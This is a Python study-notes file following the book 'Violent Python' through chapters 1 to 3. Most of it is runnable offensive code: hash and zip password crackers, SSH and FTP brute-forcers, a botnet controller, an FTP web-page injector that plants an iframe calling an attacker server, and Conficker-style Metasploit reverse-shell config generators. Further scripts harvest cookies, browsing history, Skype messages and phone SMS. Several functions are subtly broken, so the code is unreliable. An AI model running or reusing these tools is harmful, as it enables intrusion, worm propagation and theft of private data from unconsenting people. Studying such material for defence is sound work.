#####################################################################
# Chapter 1
#####################################################################

import re
import os
import nmap
import time
import dpkt
import crypt
import urllib
import sqlite3
import pexpect
import zipfile
import optparse
import mechanize
import urllib.parse
from socket import *
# from winreg import * || This is a windows only module
from PIL import Image
import geoip2.database
from threading import *
from pexpect import pxssh
from bs4 import BeautifulSoup
from PIL.ExifTags import TAGS
from PyPDF2 import PdfFileReader
from urllib.parse import urlsplit


def banner_and_service_example():
    port = 21
    banner = "FreeFloat FTP Server"
    print("[+] Checking for "+banner+" on port " + str(port))

    # Don't forget about the list.index function

    # Reserved names for some ports
    services = {
        'ftp': 21, 'ssh': 22, 'smtp': 25,
        'http': 80
    }


def socket_example(ip, port):
    # This piece of code will time out, but you get the idea

    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip, port))
        banner = s.recv(1024)
        return banner

    except Exception as e:
        print("Error = " + str(e))


def check_vuls(banner):
    with open("vul_banners.txt", "r") as f:
        for line in f.readlines():
            if line.strip("\n") in banner:
                print("Server is vulnerable: " + banner.strip("\n"))


def socket_checker():
    port_list = [21, 22, 25, 80, 110, 443]
    for x in range(1, 255):
        ip = '192.168.95.' + str(x)

        for port in port_list:
            banner = socket_example(ip, port)
            if banner:
                check_vuls(banner)

# We can use a for loop to iterate through an entire subnet of
# IP addresses for 192.168.95.1 through 192.168.95.254.
# Now let's rewrite the socket_example to check all 254 IP addresses
# with ports for telnet, SSH, smtp, http, imap, and https services.

# Useful os module functions: os.path.isfile, os.access, etc...
# print(crypt.crypt("egg", "HX"))

# We will now write a program which reads from a passwords.txt file
# and outputs the encrypted pasword, and it checks the encryption against
# the dictionary file.


def test_pass(crypted_pass):
    # removing the salt from encrypted (first two letters)
    salt = crypted_pass[0:2]
    with open("dictionary.txt", "r") as file:
        for word in file.readlines():
            word = word.strip("\n")
            crypt_word = crypt.crypt(word, salt)

            if crypt_word == crypted_pass:
                print("Found the password")
                return

    print("Password not found.")
    return


def main_func():
    with open("passwords.txt") as f:
        for line in f.readlines():
            if ":" in line:
                crypt_pass = line.split(':')[1].strip(" ")
                test_pass(crypt_pass)

# On *Nix based OS's, the /etc/shadow file stores hashed passwords.
# Challenge: update the script to crack SHA-512 hashes


def test_sha(cryptPass):
    salt = cryptPass[0:11]
    print("[+] Salt: " + salt)
    dictFile = open('dictionary.txt', 'r')
    for word in dictFile.readlines():
        word = word.strip('\n')
        cryptword = crypt.crypt(word, salt)
        print("[+] Hash value: " + cryptword)
        if (cryptword == cryptPass):
            print("[+] Found password: "+word+"\n")
            return
    print("[-] Password not found.\n")
    return


def main_sha():
    passfile = open('passwords.txt')
    for line in passfile.readlines():
        if ":" in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            print("[*] Cracking password for: "+user)
            test_sha(cryptPass)

# Now we will write a zip file password cracker.


def extract_file(zip_file, password):
    try:
        zip_file.extractall(pwd=password.encode('utf-8'))
        print("password is {}".format(password))
    except Exception as e:
        pass


def main_zip():
    parser = optparse.OptionParser("usage%prog " +
                                   "-f <zipfile> -d <dictionary>")
    parser.add_option('-f', dest='zname', type='string',
                      help='specify zip file')
    parser.add_option('-d', dest='dname', type='string',
                      help='specify dictionary file')
    options, args = parser.parse_args()

    if (options.zname == None) | (options.dname == None):
        print(parser.usage)
        exit(0)
    else:
        zname = options.zname
        dname = options.dname

    zip_file = zipfile.ZipFile(zname)
    pass_file = open(dname)

    for line in pass_file.readlines():
        password = line.strip("\n")
        t = Thread(target=extract_file, args=(zip_file, password))
        t.start()

    pass_file.close()

#####################################################################
# Chapter 2
#####################################################################

# Check the system and its vulnerabilities before choosing exploits.
# Now, we'll scan target hosts for open TCP ports. Most applications
# use TCP (TCP: 80, email: 25, FTP: 21, ...). To connect to any of
# these we need the IP address and the service port. We need to
# port scan! We can send TCP SYN packet and wait for responses,
# signalling an open port (is this called a ping?). Another form
# of this is a full 3-way handshake. We will choose to write the latter.


def handshake():
    parser = optparse.OptionParser(
        'usage %prog –H' + '<target host> -p <target port>')

    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-p', dest='tgtPort', type='string',
                      help='specify target port(s), seperated by commas')

    options, _ = parser.parse_args()
    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(', ')

    if (tgtHost == None) | (tgtPorts[0] == None):
        print(parser.usage)
        return

    port_scan(tgtHost, tgtPorts)


screenLock = Semaphore(value=1)


def conn_scan(host, port):
    try:
        conn_sock = socket(AF_INET, SOCK_STREAM)
        conn_sock.connect((host, port))

        # After connection, we know that a port is open, so we can send some data
        # and wait for a response
        conn_sock.send(b'Violent Python')
        results = conn_sock.recv(100)

        screenLock.acquire()
        print("tcp open in port {}".format(port))
        print("Got some results AKA " + str(results))

    except Exception as e:
        screenLock.acquire()
        print(e)

    finally:
        screenLock.release()
        conn_sock.close()


def port_scan(host, ports):
    try:
        target_ip = gethostbyname(host)
    except:
        print("Cannot resolve unknown host")
        return

    try:
        target_name = gethostbyaddr(target_ip)
        print('\n[+] Scan Results for: ' + target_name[0])
    except:
        print('\n[+] Scan Results for: ' + target_ip)

    setdefaulttimeout(1)
    for port in ports:
        t = Thread(target=conn_scan, args=(host, int(port)))
        t.start()

# The scanning of sockets should be done in a threaded manner, which is super simple
# using the threading module as you've done before. However, there's a disadvantage:
#         t = Thread(target=conn_scan, args=(host, int(port)))
#         t.start()
# Simply doing this will jumble up execution order. Imagine if you're outputting
# something to the terminal - disaster!!
# Use semaphores to rescue you from this situation.

# Although the above example was fun to work though, it is limited in the sense that
# it only uses handshake scanning, while you may very well want to use others as well.
# Enter, nmap-python.


def nmap_scan(host, port):
    nm = nmap.PortScanner()
    nm.scan(host, port)
    state = nm[host]['tcp'][int(port)]['state']
    return state

# Let's try to create our own SSH worm. We will use the Pexpect moduel, which can be
# used to monitor and interact with programs, making it a good choice to work with
# SSH consoles.


PROMPT = ['#', '>>>', '>', '\$']
max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
found = False
fails = 0


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password, release):
    # If you wanna use a global variable in a functional scope instead of creating a local
    # copy of the same, use the global keyword. Pylance linting will also show you if
    # you're not using any particular variable nicely (if you're only updating the variable
    # in the function).

    global found
    global fails

    try:
        s = pexpect.pxssh()
        s.login(host, user, password)
        print("Password found!")
        found = True

    # How to handle multiple exceptions!
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)

            # Recursively call again after sleeping for 5 seconds
            connect(user, host, password, False)

        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(user, host, password, False)

        else:
            print(str(e))

    finally:
        if release:
            connection_lock.release()


# Python pro tip: if you wanna break up function calls
# or long print statements up, use one of '\' these
# bad boys and move along.
def ssh_main():
    parser = optparse.OptionParser('usage%prog ' +
                                   '-H <target host> -u <user> -F <password list>')

    parser.add_option('-H', dest='tgtHost', type='string', help='target host')
    parser.add_option('-u', dest='tgtUser', type='string', help='target user')
    parser.add_option('-F', dest='passwordFile',
                      type='string', help='password file')

    options, _ = parser.parse_args()
    tgtHost, tgtUser, passwordFile = options.tgtHost, options.tgtUser, options.passwordFile

    if tgtHost == None or tgtUser == None or passwordFile == None:
        print(parser.usage)
        return

    with open(passwordFile, 'r') as pass_file:
        for line in pass_file.readlines():
            if found:
                return
            if fails > 5:
                print("Too many timeouts!")
                return

            connection_lock.acquire()
            password = line.strip("\n").strip("\r")
            print("Testing password " + password)
            t = Thread(target=connect, args=(tgtHost, tgtUser,
                                             password, True))
            _ = t.start()


# SSH can also be done with public key cryptography, which is more complex than the
# simple UNIX passwords seen earlier. Let's try to create a SSH key breaker.

stop = False


def connect_key(user, host, keyfile, release):
    global fails
    global stop

    try:
        perm_denied = "permission denied"
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connection_string = f"ssh {user}@{host} –i {keyfile} {opt}"
        child = pexpect.spawn(connection_string)

        ret = child.expect([pexpect.TIMEOUT, perm_denied,
                            ssh_newkey, conn_closed, '$', '#', ])

        if ret == 2:
            print('[-] Adding Host to ∼/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)

        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            fails += 1

        elif ret > 3:
            print("[+] Success " + str(keyfile))
            stop = True

    finally:
        if release:
            connection_lock.release()


def key_main():
    parser = optparse.OptionParser('usage%prog -H ' +
                                   '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-d', dest='passDir', type='string',
                      help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string',
                      help='specify the user')
    options, _ = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print(parser.usage)
        return

    for filename in os.listdir(passDir):
        if stop:
            print("Key found!")
            return

        if fails > 5:
            print("Too many closed connections!")
            return

        connection_lock.acquire()
        fullpath = os.path.join(filename, passDir)
        print("Testing keyfile: " + str(fullpath))
        t = Thread(target=connect_key, args=(user, host, fullpath, True))
        _ = t.start()


# This is one remote host (or a computer) we just broke into. Malicious attackers
# often use pools of such broken computers, also called a botnet for, well,
# malicious purposes.

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(str(e))

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def add_client(host, user, password):
    bot_net.append(Client(host, user, password))


def botnet_command(command):
    for client in bot_net:
        output = client.send_command(command)
        print("Output from {}".format(client.host))
        print("Output: {}".format(output))


bot_net = []
# add_client('10.10.10.110', 'root', 'toor')
# add_client('10.10.10.120', 'root', 'toor')
# add_client('10.10.10.130', 'root', 'toor')
# botnet_command('uname -v')
# botnet_command('cat /etc/issue')

# This script is attacking servers directly, but there are other ways to go about it as well.
# For example, let's study the k985ytv attack, which a botnet to inject JavaScript and
# redirect people who visit a site to download anti-virus software which stole credit card
# information. How can you do this using python?

# Before we go forward, let's talk more about FTP (file transfer protocol). You can use
# the ftplib module to determine if any service offers anonymous FTP.


def anonymous_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'random@random.com')
        print("Sucess with host: " + str(hostname))
        ftp.quit()
        return True
    except Exception as e:
        print("Unsuccessful with host: " + str(hostname))
        return False


# host = '192.168.95.179'
# anonymous_login(host)

# If you really wanna get in, and the host doesn't enable anonymous login, you can
# brute force credentials, which attackers have been quite successful with in the
# past.


def brute_login(hostname, password_file):
    file = open(password_file, 'r')
    for line in file.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1].strip('r').strip('\n')
        print("Trying {}:{}".format(username, password))

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print("[+] Login succeeded!")
            ftp.quit()
            return (username, password)

        except:
            pass

    print("Couldn't find a username:password combination")
    return (None, None)


host = '192.168.95.179'
passwdFile = 'ftp_pass.txt'

# Once we have valid FTP credentials, it is good to know if server provides web service
# (for the JS injection). On a server, the NLST command spits out a list of files, which
# we can take advantage of.


def check_ftp_webpages(ftp):
    try:
        dirlist = ftp.nlst()
    except:
        print("Couldn't find any directories :(")
        return

    pages = []
    for file in dirlist:
        fn = file.lower()

        if '.php' in fn or '.html' in fn or '.asp' in fn:
            pages.append(file)

    return pages

# Now that we have the pages, we can start injecting our own client side code to it!
# Create a malicious server and page (MetaSploit is a good framework). Victims who
# visit this page will be redirected and we'll receive a callback, through which we
# can inject our JS. If connected, there'll be a reverse TCP shell created, and through
# this shell, we'll execute commands as the administrator of the infected client.
# The next step is simple: download the file, add whatever you want, and reupload the file.


def fpt_injector(ftp, page, redirect):
    file = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, file.write)
    file.write(redirect)
    file.close()
    ftp.storlines('STOR ' + page, open(page + '.tmp'))

# After the login and checking functions used earlier, call the injector by
# redirect = '<iframe src='+\
#   '"http://10.10.10.112:8080/exploit"></iframe>'
# fpt_injector(ftp, 'index.html', redirect)
#
# which just redirects the main page to our malicious server, through which we gain
# administrative access to that victim.


def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = check_ftp_webpages(ftp)
    for defPage in defPages:
        fpt_injector(ftp, defPage, redirect)

# The k985ytv was just all this code (with the addition of trying anonymous access first, and
# if that fails, try the brute force version). In under 100 lines of python code, this
# interesting attack can be set up. Incredible.

# The next attack discuss in the book compromised over 5 million workstations in 200 countries!
# A simple python script which repeats the process of scanning for an open port and creating a
# Metasploit config file to attack the host.

# Searches for all hosts within a subnet


def find_targets(subnet):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(subnet, '445')
    target_hosts = []

    for host in nm_scan.all_hosts():
        if nm_scan[host].has_tcp(445):
            state = nm_scan[host]['tcp'][445]['state']

            if state == 'open':
                print("[+] Found target host")
                target_hosts.append(host)

    return target_hosts


# We can use MetaSploit's Meterpreter to analyze the infected target.
# We have to setup a listener function, which will do the following:

def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set PAYLOAD ' +
                      'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload ' +
                     'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

# Although this exploit has been successful in the past, we have created
# security patches which will handle this easily. This is why the
# conflicker worm used another attack vector in conjunction.
# 1. Brute force SMB username/passwords
# 2. Get access to remotely executed processes (psexec)
# 3. If success, launch Meterpreter back to the local address and port


def smb_brute(config_file, target_host, password_file, lhost, lport):
    username = 'Administrator'
    pf = open(password_file, 'r')

    for password in pf.readlines():
        password = password.strip('\n').strip('\r')
        config_file.write('use exploit/windows/smb/psexec\n')
        config_file.write('set SMBUser ' + str(username) + '\n')
        config_file.write('set SMBPass ' + str(password) + '\n')
        config_file.write('set RHOST ' + str(target_host) + '\n')
        config_file.write('set PAYLOAD ' +
                          'windows/meterpreter/reverse_tcp\n')
        config_file.write('set LPORT ' + str(lport) + '\n')
        config_file.write('set LHOST ' + lhost + '\n')
        config_file.write('exploit -j -z\n')


def conflicker_main():
    config = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage%prog ' +
                                   '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',
                      help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',
                      help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string',
                      help='password file for SMB brute force attempt')
    (options, _) = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None):
        print(parser.usage)
        exit(0)

    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'

    password_file = options.passwdFile
    tgtHosts = find_targets(options.tgtHost)
    setup_handler(config, lhost, lport)
    for tgtHost in tgtHosts:
        confickerExploit(config, tgtHost, lhost, lport)

        if password_file != None:
            smb_brute(config, tgtHost, password_file, lhost, lport)

    config.close()
    os.system('msfconsole -r meta.rc')

# Buffer overflow attacks

# These work by overwriting the next pointers of user input fields. Some essential aspects of a stack based
# buffer overflow attack:
# 1. Overflow: input which exceeds he expected value in the stack
# 2. Return address: 4 byte address used to jump directly on top of the stack
# 3. Padding: A series of NOP (no operation) instructions, which allows the attacker to guesstimate the
#    next address to jump on.
# 4. Shellcode: a piece of code written in Assembly, which can be generated from MetaSpoit

# The idea is to connect to a port using sockets, authenticate to the host, and then send in the crash
# variable.


def buffer_attack(target, command, crash):
    """ Above all this code exists some other code (including the padding, return, overflow, etc), which
    hasn't been included here. Check out the book for more precise details. """

    s = socket(AF_INET, SOCK_STREAM)
    try:
        s.connect((target, 21))
    except:
        exit(0)

    s.send("USER anonymous\r\n")
    s.recv(1024)
    s.send("PASS \r\n")
    s.recv(1024)
    s.send(command + " " + crash + "\r\n")
    time.sleep(4)

#####################################################################
# Chapter 3
#####################################################################

# Windows OS stores certain metadata regarding wireless networks, which
# can be acquired through something called the windows registry. This registry
# stores the MAC address (a unique identifier given to a network adapter) in
# a REG_BINARY value.


def reg_to_mac(reg):
    addr = ""

    for character in reg:
        addr += ("%02x " % ord(character))

    addr = addr.strip(" ").replace(" ", ":")[:17]
    return addr

# We can write a function to extract network name and MAC address for every listed
# network profile from specific keys in the windows registry.


def print_nets():
    # I'm assuming this is the directory in which the registry is held
    net = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" +\
        "\\NetworkList\\Signatures\\Unmanaged"

    key = OpenKey(HKEY_LOCAL_MACHINE, net)
    for i in range(100):
        try:
            guid = EnumKey(key, i)
            net_key = OpenKey(key, str(guid))
            _, addr, _ = EnumValue(net_key, 5)
            _, name, _ = EnumValue(net_key, 4)
            mac_addr = reg_to_mac(addr)
            net_name = str(name)
            print("[+] {} {}"/format(net_name, mac_addr))

        except:
            break

# Using MAC addresses of a wireless acess point, we can pinpoint the physical location
# as well. This can be done via the use of databases which map MAC addresses to the above
# stated locations. The code below uses the mechanize library which is for stateful web
# programming in python and the wigle API endpoints.

# The wigle_print function is pretty easy to understand. All it's doing is sending API
# requests to the wigle service with a valid username and password combination. Once
# we're authenticated, we'll be able to send requests to the query endpoint and pass
# it a MAC address, and extract its latitude and longitude using regexes. Combining
# it with the print_nets function (which spits out the MAC addresses of every
# network profile saved in the computer), we'll have the latitudes and longitudes
# of profile.


def wigle_print(username, password, netid):
    browser = mechanize.Browser()
    browser.open("http://wigle.net")
    req_data = urllib.parse.urlencode({
        'credential_0': username,
        'credential_1': password
    })

    browser.open('https://wigle.net/gps/gps/main/login', req_data)
    params = {}
    params['netid'] = netid
    req_params = urllib.parse.urlencode(params)
    resp_URL = 'http://wigle.net/gps/gps/main/confirmquery/'
    resp = browser.open(resp_URL, req_params).read()
    map_lat, map_long = 'N/A', 'N/A'

    r_lat = re.findall(r'maplat=.*&', resp)
    r_long = re.findall(r'maplon=.*&', resp)

    if r_lat:
        map_lat = r_lat[0].split('&')[0].split('=')[1]

    if r_long:
        map_long = r_long[0].split

    print("[+] Lat: {}, Long: {}".format(map_lat, map_long))

# Here's something interesting: files you deleted aren't really gone, but can actually be
# recovered, and we'll learn how to use the python OS module to do that here. (Even if
# the files were emptied out from the trash, it can still be recovered, but that isn't
# what we're going for right now).


# Trying to make this function OS independent because each OS has its own way
# of storing deleted files
def return_dir():
    dirs = ['C:\\Recycler\\', 'C:\\Recycled\\', 'C:\\$Recycle.Bin\\']
    for dir in dirs:
        if os.path.isdir(dirs):
            return dir

    return None

# In the example the author has given (most likely based on Windows), the Trash
# folder has subdirectories where the user ID is stored, which is what we need.
# Turns out, the Windows registry holds this information and we can actually
# translate the ID to a username.


def sid2user(sid):
    try:
        key = OpenKey((HKEY_LOCAL_MACHINE,
                       "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
                       + '\\' + sid))

        value, _ = QueryValueEx(key, 'ProfileImagePath')
        user = value.split('\\')[-1]
        return user

    except:
        return sid


def find_recyled():
    recyle_dir = return_dir()
    dirs = os.listdir(recyle_dir)

    # There are subdirectories within the trash folder
    for dir in dirs:
        files = os.listdir(dir)
        username = sid2user(dir)
        print("[*] Listing files for user:{}".format(username))

        for file in files:
            print("[+] Found file: {}".format(str(file)))

# Now, this gets really interesting. You can actually check the contents and metadata of these files
# to find interesting information, using techniques which the forensic investigator in the book used
# to catch the criminal. Metadata can store useful information like the author's name, file creation
# or modification time, etc. Pro tip: photos may store GPS location. PyPDF, the tool you've used
# before, can also be used to check out metadata for pdf documents.


def print_meta(filename):
    pdf = PdfFileReader(open(filename, 'rb'))
    doc = pdf.getDocumentInfo()
    print("[*] Metadata for document: " + str(filename))
    for metadata in doc:
        print(doc[metadata])

# There's a thing called exif (exchange image file format) which defines how to store images
# and videos. Digital cameras, smartphones, etc use this while saving media. We can use the
# exiftool, written by some dope person, which can analyze the exif tags in photos/videos.
# For example, think of the photos app on Mac OS. There's a section of the app in which we
# can arrange photos in terms of the geographic region. Think about HOW the app is doing that.
# The answer is obvious: the only way that can be done is that the latitude and longitude of
# where the photo was taken must be encoded somewhere in the photo, which is then used to display
# it in a map. Let's write a script which downloads photos from a site and checks its exif tags.


def find_images(url):
    print("[+] Finding images on url: {}".format(url))
    url_content = urllib.request.urlopen(url).read()
    soup = BeautifulSoup(url_content, 'html.parser')
    images = soup.find_all('img')
    return images


def download_image(image):
    try:
        print("[+] Download image")
        image_src = image['src']
        image_content = urllib.request.urlopen(image_src).read()

        # Doing this probably extracts the image name exactly from the src
        image_file_name = os.path.basename(urlsplit(image_src)[2])

        with open(image_file_name, 'wb') as file:
            file.write(image_content)

        return image_file_name
    except:
        return ''

# The python library PIL can be used to process images in python. It actually has a
# function (called getexif) which retrieves the very thing we're talking about.
# We check the exif for GPS info and print it out.


def test_for_exif(image_file_name):
    try:
        exif_data = {}
        img_data = Image.open(image_file_name)
        info = img_data.getexif()

        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                exif_data[decoded] = value

            exifGPS = exif_data['GPSInfo']
            if exifGPS:
                print("[+] File {} contains GPS metadata".format(image_file_name))
                print(exif_data)
            else:
                print("[-] No GPS metadata in file")
        else:
            print("[-] No exif tags outputted by function")

    except Exception as e:
        print("[-] Something went wrong: " + str(e))


def img_exif_main(url):
    images = find_images(url)
    for image in images:
        file = download_image(image)
        test_for_exif(file)

# Databases are one of the most popular ways of storing data, and out of all types of databases,
# the name SQLite should ring a heavy bell because of its easy of use. Also, instead of a database
# server, SQLite operates on a single file (which is saved on the project directory), making it
# a good target for, ahem, hacking stuff.

# Skype also uses SQLite and the database file is stored in different directories in different OS's
# as usual (for MAC, it is cd /Users/<User>/Library/Application\ Support/Skype/<Skypeaccount>). We
# can connect to these databases and check out what the application stores in it; spoiler alert -
# it contains goodies like contacts, accounts, messages, etc (basically anything that is in the app
# itself).


def print_profile(skype_db):
    conn = sqlite3.connect(skype_db)
    c = conn.cursor()
    c.execute(
        "SELECT fullname, skypename, city, country, datetime(profile_timestamp,'unixepoch') FROM Accounts;")

    for row in c:
        print("[*] Found profile")
        print('[+] User: '+str(row[0]))
        print('[+] Skype Username: '+str(row[1]))
        print('[+] Location: '+str(row[2])+','+str(row[3]))
        print('[+] Profile Date: '+str(row[4]))

# Pass the above function "main.db" along with its absolute path, for whatever OS you're on.
# Using a similar idea from above, we'll extract some data from the contacts table.


def print_contacts(skyp_db):
    conn = sqlite3.connect(skyp_db)
    c = conn.cursor()
    c.execute(
        "SELECT  displayname, skypename, city, country, phone_mobile, birthday FROM Contacts;")

    for row in c:
        print("[*] Found contacts")
        print('[+] User : ' + str(row[0]))
        print('[+] Skype Username : ' + str(row[1]))
        if str(row[2]) != '' and str(row[2]) != 'None':
            print('[+] Location : ' + str(row[2]) + ',' + str(row[3]))
        if str(row[4]) != 'None':
            print('[+] Mobile Number : ' + str(row[4]))
        if str(row[5]) != 'None':
            print('[+] Birthday : ' + str(row[5]))

# So we extracted specific columns from specific tables. What if we wanted to output
# some info of multiple tables together? This calls for the infamous join. For example -
# to output a call, we need info from the Calls and Conversation tables.


def print_call_log(skype_db):
    conn = sqlite3.connect(skype_db)
    c = conn.cursor()

    # Select the call timestamp and identity from table Calls and Conversations where
    # both ids are equal
    c.execute(
        "SELECT datetime(begin_timestamp,'unixepoch'), \
        identity FROM calls, conversations WHERE \
        calls.conv_dbid = conversations.id;"
    )

    for row in c:
        print("[+] Call time: {} | Identity: {}".format(str(row[0]), str(row[1])))

# The skype database also stores all messages received and sent by the user profile.
# Very secure! ;) ;)


def print_mesages(skype_db):
    conn = sqlite3.connect(skype_db)
    c = conn.cursor()
    c.execute("SELECT datetime(timestamp,'unixepoch'), \
    dialog_partner, author, body_xml FROM Messages;")

    for row in c:
        try:
            if 'partlist' not in str(row[3]):

                # If dialog_partner != author
                if str(row[1]) != str(row[2]):
                    msg_direction = "To " + str(row[1]) + ": "

                else:
                    msg_direction = "To " + str(row[2]) + ": "

                print("Time: {} {} {}".format(
                    str(row[0]), msg_direction, str(row[3])))
        except:
            pass

# Browsers also store certain information in databases. For instance, firefox stores certain
# things in SQLite as well (In MAC OX, it is
# /Users/<USER>/Library/Application\ Support/Firefox/Profiles/<profile folder>). One more
# pro tip: learn linux cmd seriously. For example - as you were reading this section, you
# were thinking, "I wonder how people find these files. On the web? Oh gee, I'm gonna have
# to look for these things one folder at a time?!". But there are easier ways, if you know
# you command line homie. You could just go to the firefox main directory and search for
# files using regexes i.e. ls *.sqlite i.e. show all files ending with a .sqlite extension!


def print_firefox_downloads(db):
    conn = sqlite3.connect(db)
    c = conn.cursor()

    # For some reason, firefox developers decided to multiply the UNIX epoch time by 1000000
    # before saving it in the DB, so we divide it to get the actual epoch time.
    c.execute('SELECT name, source, datetime(endTime/1000000,\
    \'unixepoch\') FROM moz_downloads;')

    for row in c:
        print(
            "File {} downloaded from source {} @ {}".format(str(row[0]), str(row[1]), str(row[2])))

# What if you want to log into sites that use authentication? Here's how. Most websites that use
# authentication use cookies. When logged in successfully, the login page sets a cookie and redirects
# the page to another section. After that, no matter how many times you refresh the page, the session
# seems to persist. How? Cookies (or tokens of some other kind). In fact, even Instagram does this;
# this is unavoidable for user experience reasons (you'd have to login every time you visit another
# person's profile or search for something). If you're trying to break into a website, why not break
# into the source of what you're using to view the website in the first place?


def extract_cookies(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute('SELECT host, name, value FROM moz_cookies')

        for row in c:
            # Double the {{}}'s if you want to print a literal curly brace in format string
            print("Host: {}, Cookie: {{{}:{}}}, ".format(
                str(row[0]), str(row[1]), str(row[2])))

    except Exception as e:
        # Doing this because in older versions of sqlite3, there may be an "encryption"
        # error which arises
        if 'encrypted' in str(e):
            print('[*] Error reading your cookies database.')
            print('[*] Upgrade your Python-Sqlite3 Library')


def print_history(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute("select url, datetime(visit_date/1000000, \
        'unixepoch') from moz_places, moz_historyvisits \
        where visit_count > 0 and moz_places.id==\
        moz_historyvisits.place_id;")

        for row in c:
            url = str(row[0])
            if 'google' in url.lower():
                r = re.findall(r'q=.*\&', url)
                if r:
                    search = r[0].split('&')[0]
                    search = search.replace('q=', '').replace('+', ' ')
                    print(
                        "[+] Google search for {} on {}".format(search, str(row[1])))

    except Exception as e:
        if 'encrypted' in str(e):
            print('[*] Error reading your cookies database.')
            print('[*] Upgrade your Python-Sqlite3 Library')

# Using regular expressions, you can search for specific things inside a browser history,
# which may reveal pretty compromising things. Let's expand upon the previous function
# to search for google in the visited URLs.

# A very important point --
# The coming function in the book composes all the previous
# functions we've written. In doing so, we will generate the full path of the SQLite database
# file. We could just hardcode the path string (Users/Files/Location/file.sqlite), but this
# will make it platform dependent: using os.path.join and other os module functions lets us
# write os-independent scripts, which is what we're gunning for.

# Investigating itunes mobile backups? In April 2011, it was revealed that Apple devices
# saved GPS coordinates of the device's movements in a database file, which might obviously
# be used for bad purposes. This is not just limited to locations. Text messages are
# susceptible to the same vulnerability, which is at its worst during phone backups.
# Phone backups are stored in a special directory on the computer
# (MAC OS: /Users/<USERNAME>/Library/Application Support/MobileSync/Backup/). The
# directory contains a bunch of files with garbage names. To get more info out of the
# files, we can use the UNIX command "file", through which we can discover the database
# files. The problem now is that we don't know the structure of these databases, which
# we need before we can do anything with it like in the previous section.

# We will write a function which attempts to connect to each of these files and spit
# out tables for sqlite_master (exists in each SQLite db).


def print_tables(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()

        # Printing all tables from the master table
        c.execute('SELECT tbl_name FROM sqlite_master \
        WHERE type==\"table\";')
        print("[*] Connected to database")

        for row in c:
            print("[+] Table {}".format(str(row)))
    except:
        pass

    finally:
        conn.close()


def open_dir():
    dir = os.listdir(os.getcwd())
    # For each file in the backup directory, try to connect to it
    # It'll only do so if it is sqlite file, otherwise it will raise an exception
    for file in dir:
        print_tables(file)

# One of the files will have a messages db. Remember that rhere will be different backup folders,
# so we want to write a function which will only return the messages db. The current version will
# enumerate all tables on all files.


def is_message_table(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()

        # Printing all tables from the master table
        c.execute('SELECT tbl_name FROM sqlite_master \
        WHERE type==\"table\";')

        for row in c:
            if 'messages' in str(row):
                return True
    except:
        return False


def print_messages(db):
    try:
        conn = sqlite3.connect(db)
        c = conn.cursor()
        c.execute('select datetime(date,\'unixepoch\'),\
        address, text from message WHERE address>0;')

        for row in c:
            print("Date: {}, Address: {}, and Message: {}".format(
                str(row[0]), str(row[1]), str(row[2])))
    except:
        pass

# backup_path is the directory in which the backup folders are


def messages_main(backup_path):
    dirs = os.listdir(backup_path)
    for file in dirs:
        fullpath = os.path.join(backup_path, file)

        if is_message_table(fullpath):
            try:
                print("[*] Found some spicy messages")
                print_mesages(fullpath)
            except:
                pass


#####################################################################
# Chapter 4
#####################################################################

# Let's learn how to look at network traffic using python. We'll use some existing
# database which maps IP addresses to physical locations (just like we did with
